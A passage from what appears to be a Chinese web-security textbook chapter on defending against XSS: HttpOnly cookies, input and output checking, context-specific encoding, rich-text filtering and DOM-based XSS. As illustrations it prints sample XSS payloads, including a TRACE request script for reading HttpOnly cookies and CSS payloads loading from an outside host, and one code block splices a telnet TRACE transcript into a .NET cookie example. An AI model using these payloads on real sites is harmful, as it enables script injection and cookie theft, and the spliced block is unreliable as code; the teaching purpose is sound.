<p>在这段代码中，cookie1没有HttpOnly，cookie2被标记为HttpOnly。两个Cookie均被写入浏览器：测试页面的HTTP响应头<br>浏览器确实接收了两个Cookie：<br>浏览器接收到两个Cookie<br>但是只有cookie1被JavaScript读取到：<br>cookie1被JavaScript读取HttpOnly起到了应有的作用。</p>
<p>在不同的语言中，给Cookie添加HttpOnly的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Java EE</div><div class="line">response.setHeader(&quot;Set-Cookie&quot;, &quot;cookiename=value;  Path=/;Domain=domainvalue;Max-Ag</div><div class="line">e=seconds;HTTPOnly&quot;);</div><div class="line">C#</div><div class="line">HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;);</div><div class="line">myCookie.HttpOnly = true;</div><div class="line">Response.AppendCookie(myCookie);</div><div class="line">VB.NET</div><div class="line">Dim myCookie As HttpCookie = new HttpCookie(&quot;myCookie&quot;)</div><div class="line">myCookie.HttpOnly = True</div><div class="line">Response.AppendCookie(myCookie)</div><div class="line">但是在.NET 1.1中需要手动添加：$ telnet foo.com 80</div><div class="line">Trying 127.0.0.1...</div><div class="line">Connected to foo.bar.</div><div class="line">Escape character is ‘^]’.</div><div class="line">TRACE / HTTP/1.1</div><div class="line">Host: foo.bar</div><div class="line">X-Header: test</div><div class="line"></div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Mon, 02 Dec 2002 19:24:51 GMT</div><div class="line">Server: Apache/2.0.40 (Unix)</div><div class="line">Content-Type: message/http</div><div class="line"></div><div class="line">TRACE / HTTP/1.1</div><div class="line">Host: foo.bar</div><div class="line">X-Header: test</div><div class="line">Response.Cookies[cookie].Path += &quot;;HTTPOnly&quot;;PHP 4</div><div class="line">header(&quot;Set-Cookie: hidden=value; httpOnly&quot;);</div><div class="line">PHP 5</div><div class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</div></pre></td></tr></table></figure>
<p>最后一个参数为HttpOnly属性。<br>添加HttpOnly的过程简单，效果明显，有如四两拨千斤。但是在部署时需要注意，如果业务非常复杂，则需要在所有Set-Cookie的地方，给关键Cookie都加上HttpOnly。漏掉了一个地方，都可能使得这个方案失效。<br>在过去几年中，曾经出现过一些能够绕过HttpOnly的攻击方法。Apache支持的一个Header是TRACE。TRACE一般用于调试，它会将请求头作为HTTP Response Body返回。</p>
<p>利用这个特性，可以把HttpOnly Cookie读出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">&lt;!--</div><div class="line">function sendTrace () &#123;</div><div class="line">    var xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">    xmlHttp.open(&quot;TRACE&quot;, &quot;http://foo.bar&quot;,false);</div><div class="line">    xmlHttp.send();</div><div class="line">    xmlDoc=xmlHttp.responseText;</div><div class="line">    alert(xmlDoc);</div><div class="line">&#125;</div><div class="line">//--&gt;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;INPUT TYPE=BUTTON OnClick=&quot;sendTrace();&quot; VALUE=&quot;Send Trace Request&quot;&gt;</div></pre></td></tr></table></figure>
<p>结果如下：JavaScript读取到cookie<br>目前各厂商都已经修补了这些漏洞，但是未来也许还会有新的漏洞出现。现在业界给关键业务添加HttpOnly Cookie已经成为一种“标准”的做法。<br>但是，HttpOnly不是万能的，添加了HttpOnly不等于解决了XSS问题。<br>XSS攻击带来的不光是Cookie劫持问题，还有窃取用户信息、模拟用户身份执行操作等诸多严重的后果。如前文所述，攻击者利用AJAX构造HTTP请求，以用户身份完成的操作，就是在不知道用户Cookie的情况下进行的。<br>使用HttpOnly有助于缓解XSS攻击，但仍然需要其他能够解决XSS漏洞的方案。</p>
<p><hr></p>
<h3 id="3-3-2-输入检查"><a href="#3-3-2-输入检查" class="headerlink" title="3.3.2 输入检查"></a>3.3.2 输入检查</h3><p>输入检查</p>
<p>常见的Web漏洞如XSS、SQL Injection等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。<br>输入检查，在很多时候也被用于格式检查。例如，用户在网站注册时填写的用户名，会被要求只能为字母、数字的组合。比如“hello1234”是一个合法的用户名，而“hello#$^”就是一个非法的用户名。<br>又如注册时填写的电话、邮件、生日等信息，都有一定的格式规范。比如手机号码，应该是不长于16位的数字，且中国大陆地区的手机号码可能是13x、15x开头的，否则即为非法。<br>这些格式检查，有点像一种“白名单”，也可以让一些基于特殊字符的攻击失效。<br>输入检查的逻辑，必须放在服务器端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。<br>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、”等。如果发现存在特殊字符，则将这些字符过滤或者编码。<br>比较智能的“输入检查”，可能还会匹配XSS的特征。比如查找用户数据中是否包含了<code>&lt;script&gt;</code> 、<code>javascript</code> 等敏感字符。<br>这种输入检查的方式，可以称为<code>XSS Filter</code>。互联网上有很多开源的<code>XSS Filter</code>的实现。</p>
<p>XSS Filter在用户提交数据时获取变量，并进行XSS检查；但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。<br>比如下面这个XSS漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script src=&quot;$var&quot; &gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>其中<code>$var</code>是用户可以控制的变量。用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。</p>
<p>如果是一个<code>全局性的XSS Filter</code>，则无法看到用户数据的输出语境，而只能看到用户提交了一个URL，就很可能会漏报。因为在大多数情况下，URL是一种合法的用户数据。</p>
<p>XSS Filter还有一个问题——其对“&lt;”、“&gt;”等字符的处理，可能会改变用户数据的语义。</p>
<p>对于XSS Filter来说，发现了敏感字符“&lt;”。如果XSS Filter不够“智能”，粗暴地过滤或者替换了“&lt;”，则可能会改变用户原本的意思。<br>输入数据，还可能会被展示在多个地方，每个地方的语境可能各不相同，如果使用单一的替换操作，则可能会出现问题。</p>
<p><hr></p>
<h3 id="3-3-3-输出检查"><a href="#3-3-3-输出检查" class="headerlink" title="3.3.3 输出检查"></a>3.3.3 输出检查</h3><p>一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>
<p>编码分为很多种，针对HTML代码的编码方式是<code>HtmlEncode</code>。<br><code>HtmlEncode</code>并非专用名词，它只是一种函数实现。它的作用是将字符转换成<code>HTMLEntities</code>，对应的标准是ISO-8859-1。<br>为了对抗XSS，在HtmlEncode中要求至少转换以下字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&amp; --&gt; &amp;amp;</div><div class="line">&lt; --&gt; &amp;lt;</div><div class="line">&gt; --&gt; &amp;gt;</div><div class="line">&gt; &quot; --&gt; &amp;quot;</div><div class="line">&gt; &apos; --&gt; &amp;#x27;　　 &amp;apos; 不推荐</div><div class="line">&gt; / --&gt; &amp;#x2F;　　 包含反斜线是因为它可能会闭合一些HTML entity</div><div class="line">&gt; 在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。</div><div class="line">&gt; 相应地，JavaScript的编码方式可以使用JavascriptEncode。</div><div class="line">&gt; JavascriptEncode与HtmlEncode的编码方法不同，它需要使用“\”对特殊字符进行转义。在对抗XSS时，还要求输出的变量必须在引号内部，以避免造成安全问题。比较下面两种写法：</div><div class="line">&gt; var x = escapeJavascript($evil);</div><div class="line"></div><div class="line">var y = &apos;&quot;&apos;+escapeJavascript($evil)+&apos;&quot;&apos;;</div><div class="line">如果escapeJavascript()函数只转义了几个危险字符，比如‘、”、&lt;、&gt;、\、&amp;、#等，那么上面的两行代码输出后可能会变成：</div><div class="line">var x = 1;alert(2);</div><div class="line"></div><div class="line">var y = &quot;1;alert(2)&quot;;</div><div class="line">第一行执行额外的代码了；第二行则是安全的。对于后者，攻击者即使想要逃逸出引号的范围，也会遇到困难：</div><div class="line">var y = &quot;\&quot;;alert(1);\/\/&quot;;</div><div class="line">所以要求使用JavascriptEncode的变量输出一定要在引号内。</div><div class="line">可是很多开发者没有这个习惯怎么办？这就只能使用一个更加严格的JavascriptEncode函数来保证安全——除了数字、字母外的所有字符，都使用十六进制“\xHH”的方式进行编码。在本例中：</div><div class="line">var x = 1;alert(2);</div><div class="line">变成了：</div><div class="line">var x = 1\x3balert\x282\x29;如此代码可以保证是安全的。</div><div class="line">在OWASP ESAPI中有一个安全的JavascriptEncode的实现，非常严格。</div><div class="line">        /**</div><div class="line">         * &#123;@inheritDoc&#125;</div><div class="line">         *</div><div class="line">         * Returns backslash encoded numeric format. Does not use backslash character escapes</div><div class="line">         * such as, \&quot; or \&apos; as these may cause parsing problems. For example, if a javascript</div><div class="line">         * attribute, such as onmouseover, contains a \&quot; that will close the entire attribute and</div><div class="line">         * allow an attacker to inject another script attribute.</div><div class="line">     *</div><div class="line">     * @param immune</div><div class="line">     */</div><div class="line">        public String encodeCharacter( char[] immune, Character c ) &#123;</div><div class="line"></div><div class="line">                // check for immune characters</div><div class="line">                if ( containsCharacter(c, immune ) ) &#123;</div><div class="line">                        return &quot;&quot;+c;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                // check for alphanumeric characters</div><div class="line">                String hex = Codec.getHexForNonAlphanumeric(c);</div><div class="line">                if ( hex == null ) &#123;</div><div class="line">                        return &quot;&quot;+c;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                // Do not use these shortcuts as they can be used to break out of a context</div><div class="line">                // if ( ch == 0x00 ) return &quot;\\0&quot;;</div><div class="line">                // if ( ch == 0x08 ) return &quot;\\b&quot;;</div><div class="line">                // if ( ch == 0x09 ) return &quot;\\t&quot;;</div><div class="line">                // if ( ch == 0x0a ) return &quot;\\n&quot;;</div><div class="line">                // if ( ch == 0x0b ) return &quot;\\v&quot;;</div><div class="line">                // if ( ch == 0x0c ) return &quot;\\f&quot;;</div><div class="line">                // if ( ch == 0x0d ) return &quot;\\r&quot;;</div><div class="line">                // if ( ch == 0x22 ) return &quot;\\\&quot;&quot;;</div><div class="line">                // if ( ch == 0x27 ) return &quot;\\&apos;&quot;;</div><div class="line">                // if ( ch == 0x5c ) return &quot;\\\\&quot;;</div><div class="line"></div><div class="line">                // encode up to 256 with \\xHH</div><div class="line">        String temp = Integer.toHexString(c);</div><div class="line">                if ( c &lt; 256 ) &#123;</div><div class="line">                String pad = &quot;00&quot;.substring(temp.length() );</div><div class="line">                return &quot;\\x&quot; + pad + temp.toUpperCase();</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                // otherwise encode with \\uHHHH</div><div class="line">        String pad = &quot;0000&quot;.substring(temp.length() );</div><div class="line">        return &quot;\\u&quot; + pad + temp.toUpperCase();</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>除了HtmlEncode、JavascriptEncode外，还有许多用于各种情况的编码函数，比如XMLEncode（其实现与HtmlEncode类似）、JSONEncode（与JavascriptEncode类似）等。<br>在“Apache Common Lang”的“StringEscapeUtils”里，提供了许多escape的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">import org.apache.commons.lang.StringEscapeUtils;</div><div class="line"></div><div class="line">public class StringUtilsEscapeExampleV1 &#123;</div><div class="line"></div><div class="line">  public static void main(String args[]) &#123;</div><div class="line">    String unescapedJava = &quot;Are you for real?&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeJava(unescapedJava));</div><div class="line"></div><div class="line">    String unescapedJavaScript = &quot;What&apos;s in a name?&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeJavaScript(unescapedJavaScript));</div><div class="line"></div><div class="line">    String unescapedSql = &quot;Mc&apos;Williams&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeSql(unescapedSql));</div><div class="line"></div><div class="line">    String unescapedXML = &quot;&lt;data&gt;&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeXml(unescapedXML));</div><div class="line"></div><div class="line">    String unescapedHTML = &quot;&lt;data&gt;&quot;;</div><div class="line">    System.err.println(StringEscapeUtils.escapeHtml(unescapedHTML));</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以在适当的情况下选用适当的函数。需要注意的是，编码后的数据长度可能会发生改变，从而影响某些功能。在写代码时需要注意这个细节，以免产生不必要的bug。</p>
<p>只需一种编码吗<br>XSS攻击主要发生在MVC架构中的View层。大部分的XSS漏洞可以在模板系统中解决。<br>在Python的开发框架Django自带的模板系统“Django Templates”中，可以使用escape进行HtmlEncode。比如：</p>
<p><kbd> { { var|escape }} </kbd></p>
<p>这样写的变量，会被HtmlEncode编码。<br>这一特性在Django 1.0中得到了加强——默认所有的变量都会被escape。这个做法是值得称道的，它符合“Secure By Default”原则。<br>在Python的另一个框架web2py中，也默认escape了所有的变量。在web2py的安全文档中，有这样一句话：</p>
<p><kbd> web2py, by default, escapes all variables rendered in the view, thus preventing XSS. </kbd></p>
<p>Django和web2py都选择在View层默认HtmlEncode所有变量以对抗XSS，出发点很好。但是，像web2py这样认为这就解决了XSS问题，是错误的观点。</p>
<p>XSS是很复杂的问题，需要“在正确的地方使用正确的编码方式”。看看下面这个例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('$var');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>开发者希望看到的效果是，用户点击链接后，弹出变量“$var”的内容。可是用户如果输入：</div><div class="line">$var = htmlencode("');alert('2");</div><div class="line">对变量“$var”进行HtmlEncode后，渲染的结果是：</div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line">对于浏览器来说，htmlparser会优先于JavaScript Parser执行，所以解析过程是，被HtmlEncode的字符先被解码，然后执行JavaScript事件。</div><div class="line">因此，经过htmlparser解析后相当于：</div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('');alert('2');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
<p>成功在onclick事件中注入了XSS代码！</p>
<p>第一次弹框：</p>
<p>执行第一个alert</p>
<p>第二次弹框：执行第二个alert</p>
<p>导致XSS攻击发生的原因，是由于没有分清楚输出变量的语境！因此并非在模板引擎中使用了auto-escape就万事大吉了，XSS的防御需要区分情况对待。</p>
<p><hr></p>
<h3 id="3-3-4-正确地防御XSS"><a href="#3-3-4-正确地防御XSS" class="headerlink" title="3.3.4 正确地防御XSS"></a>3.3.4 正确地防御XSS</h3><p>正确地防御XSS</p>
<p>为了更好地设计XSS防御方案，需要认清XSS产生的本质原因。<br>XSS的本质还是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而混淆了原本的语义，产生了新的语义。<br>如果网站使用了MVC架构，那么XSS就发生在View层——在应用拼接变量到HTML页面时产生。所以在用户提交数据处进行输入检查的方案，其实并不是在真正发生攻击的地方做防御。<br>想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。<br>下面将用变量“$var”表示用户数据，它将被填充入HTML代码中。可能存在以下场景。<br>在HTML标签中输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div&gt;$var&lt;/div&gt;</div><div class="line">&lt;a href=# &gt;$var&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>所有在标签中输出的变量，如果未做任何处理，都能导致直接产生XSS。<br>在这种场景下，XSS的利用方式一般是构造一个<code>&lt;script&gt;</code>标签，或者是任何能够产生脚本执行的方式。比如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=# &gt;&lt;img src=# onerror=alert(1) /&gt;&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>防御方法是对变量使用HtmlEncode。<br>在HTML属性中输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div id=&quot;abc&quot; name=&quot;$var&quot; &gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>与在HTML标签中输出类似，可能的攻击方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div id=&quot;abc&quot; name=&quot;&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;&quot; &gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<p>防御方法也是采用HtmlEncode。<br>在OWASP ESAPI中推荐了一种更严格的HtmlEncode——除了字母、数字外，其他所有的特殊字符都被编码成HTMLEntities。<br>String safe = ESAPI.encoder().encodeForHTMLAttribute( request.getParameter( “input” ) );<br>这种严格的编码方式，可以保证不会出现任何安全问题。</p>
<p>在<code>&lt;script&gt;</code>标签中输出</p>
<p>在<code>&lt;script&gt;</code>标签中输出时，首先应该确保输出的变量在引号中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var x = &quot;$var&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>攻击者需要先闭合引号才能实施XSS攻击：<script></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var x = &quot;&quot;;alert(/xss/);//&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>防御时使用JavascriptEncode。<br>在事件中输出<br>在事件中输出和在<code>&lt;script&gt;</code>标签中输出类似：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=# onclick=&quot;funcA(&apos;$var&apos;)&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>可能的攻击方法：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('');alert(/xss/);//')"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在防御时需要使用JavascriptEncode。<br>在CSS中输出<br>在CSS和style、style attribute中形成XSS的方式非常多样化，参考下面几个XSS的例子。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@import'http://ha.ckers.org/xss.css';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">-moz-binding</span>:<span class="built_in">url</span>(<span class="string">"http://ha.ckers.org/xssmoz.xml#xss"</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">"behavior: url(xss.htc);"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">li</span> &#123;<span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">UL</span>&gt;</span><span class="tag">&lt;<span class="name">LI</span>&gt;</span>XSS</div><div class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>所以，一般来说，尽可能禁止用户可控制的变量在“<style>标签”、“HTML标签的style属性”以及“CSS文件”中输出。如果一定有这样的需求，则推荐使用OWASP ESAPI中的encodeForCSS()函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">String safe = ESAPI.encoder().encodeForCSS( request.getParameter( &quot;input&quot; ) );</div><div class="line">其实现原理类似于ESAPI.encoder().encodeForJavaScript()函数，除了字母、数字外的所有字符都被编码成十六进制形式“\uHH”。</div></pre></td></tr></table></figure>
<p>在地址中输出</p>
<p>在地址中输出也比较复杂。一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可。URLEncode会将字符转换为<code>%HH</code>形式，比如空格就是<code>%20</code>，<code>&lt;</code>符号是<code>%3c</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test=$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>可能的攻击方法：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test="</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>"" &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>经过URLEncode后，变成了：<code>&lt;a href=&quot;http://www.evil.com/?test=%22%20onclick%3balert%281%29%22&quot; &gt;test&lt;/a&gt;</code><br>但是还有一种情况，就是整个URL能够被用户完全控制。这时URL的Protocal和Host部分是不能够使用URLEncode的，否则会改变URL的语义。</p>
<p>在Protocal 与Host中，如果使用严格的URLEncode函数，则会把“://”、“.”等都编码掉。<br>对于如下的输出方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;$var&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>攻击者可能会构造伪协议实施攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;javascript:alert(1);&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>除了“javascript”作为伪协议可以执行代码外，还有“vbscript”、“dataURI”等伪协议可能导致脚本执行。<br>“dataURI”这个伪协议是Mozilla所支持的，能够将一段代码写在URL里。如下例：<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">test</a><br>这段代码的意思是，以text/html的格式加载编码为base64的数据，加载完成后实际上是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;alert(1);&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>点击<code>&lt;a&gt;</code>标签的链接，将导致执行脚本。</p>
<p>执行恶意脚本</p>
<p>由此可见，如果用户能够完全控制URL，则可以执行脚本的方式有很多。如何解决这种情况呢？<br>一般来说，如果变量是整个URL，则应该先检查变量是否以“http”开头（如果不是则自动添加），以保证不会出现伪协议类的XSS攻击。<br><a href="$var" >test</a><br>在此之后，再对变量进行URLEncode，即可保证不会有此类的XSS发生了。<br>OWASP ESAPI中有一个URLEncode的实现（此API未解决伪协议的问题）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">String safe = ESAPI.encoder().encodeForURL( request.getParameter( &quot;input&quot; ) );</div></pre></td></tr></table></figure>
<p><hr /></p>
<h3 id="3-3-5-处理富文本"><a href="#3-3-5-处理富文本" class="headerlink" title="3.3.5 处理富文本"></a>3.3.5 处理富文本</h3><p>有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。比如一个用户在论坛里发帖，帖子的内容里要有图片、视频，表格等，这些“富文本”的效果都需要通过HTML代码来实现。<br>如何区分安全的“富文本”和有攻击性的XSS呢？<br>在处理富文本时，还是要回到“输入检查”的思路上来。“输入检查”的主要问题是，在检查时还不知道变量的输出语境。但用户提交的“富文本”数据，其语义是完整的HTML代码，在输出时也不会拼凑到某个标签的属性中。因此可以特殊情况特殊处理。</p>
<p>列出了所有在HTML中可能执行脚本的地方。而一个优秀的“XSS Filter”，也应该能够找出HTML代码中所有可能执行脚本的地方。<br>HTML是一种结构化的语言，比较好分析。通过htmlparser可以解析出HTML代码的标签、标签属性和事件。</p>
<p>在过滤富文本时，“事件”应该被严格禁止，因为“富文本”的展示需求里不应该包括“事件”这种动态效果。而一些危险的标签，比如 <code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 、<code>&lt;base&gt;</code> 、<code>&lt;form&gt;</code> 等，也是应该严格禁止的。</p>
<p>在标签的选择上，应该使用白名单，避免使用黑名单。比如，只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较“安全”的标签存在。</p>
<p>“白名单原则”不仅仅用于标签的选择，同样应该用于属性与事件的选择。</p>
<p>在富文本过滤中，处理CSS也是一件麻烦的事情。如果允许用户自定义CSS、style，则也可能导致XSS攻击。因此尽可能地禁止用户自定义CSS与style。<br>如果一定要允许用户自定义样式，则只能像过滤“富文本”一样过滤“CSS”。这需要一个CSS Parser对样式进行智能分析，检查其中是否包含危险代码。</p>
<p>有一些比较成熟的开源项目，实现了对富文本的XSS检查。<br>Anti-Samy是OWASP上的一个开源项目，也是目前最好的XSS Filter。最早它是基于Java的，现在已经扩展到.NET等语言。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">import org.owasp.validator.html.*;</div><div class="line">Policy policy = Policy.getInstance(POLICY_FILE_LOCATION);</div><div class="line">AntiSamy as = new AntiSamy();</div><div class="line">CleanResults cr = as.scan(dirtyInput, policy);</div><div class="line">MyUserDAO.storeUserProfile(cr.getCleanHTML()); // some custom function</div></pre></td></tr></table></figure>
<p>在PHP中，可以使用另外一个广受好评的开源项目：HTMLPurify。</p>
<p><hr /></p>
<h3 id="3-3-6-防御DOM-Based-XSS"><a href="#3-3-6-防御DOM-Based-XSS" class="headerlink" title="3.3.6 防御DOM Based XSS"></a>3.3.6 防御DOM Based XSS</h3><p>DOM Based XSS是如何形成的呢？回头看看这个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">function test()&#123;</div><div class="line">  var str = document.getElementById(&quot;text&quot;).value;</div><div class="line">  document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</div><div class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;在button的onclick事件中，执行了test()函数，而该函数中最关键的一句是：</div><div class="line">document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</div></pre></td></tr></table></figure>
<p>将HTML代码写入了DOM节点，最后导致了XSS的发生。<br>事实上，DOM Based XSS是从JavaScript中输出数据到HTML页面里。而前文提到的方法都是针对“从服务器应用直接输出到HTML页面”的XSS漏洞，因此并不适用于DOM Based XSS。</p>
<p><hr /></p>
<h3 id="3-3-7-换个角度看XSS的风险"><a href="#3-3-7-换个角度看XSS的风险" class="headerlink" title="3.3.7 换个角度看XSS的风险"></a>3.3.7 换个角度看XSS的风险</h3><p>前文谈到的所有XSS攻击，都是从漏洞形成的原理上看的。如果从业务风险的角度来看，则会有不同的观点。<br>一般来说，存储型XSS的风险会高于反射型XSS。因为存储型XSS会保存在服务器上，有可能会跨页面存在。它不改变页面URL的原有结构，因此有时候还能逃过一些IDS的检测。比如IE 8的XSS Filter和Firefox的Noscript Extension，都会检查地址栏中的地址是否包含XSS脚本。而跨页面的存储型XSS可能会绕过这些检测工具。<br>从攻击过程来说，反射型XSS，一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；而存储型XSS，则只需要让用户查看一个正常的URL链接。比如一个Web邮箱的邮件正文页面存在一个存储型的XSS漏洞，当用户打开一封新邮件时，XSS Payload会被执行。这样的漏洞极其隐蔽，且埋伏在用户的正常业务中，风险颇高</p>
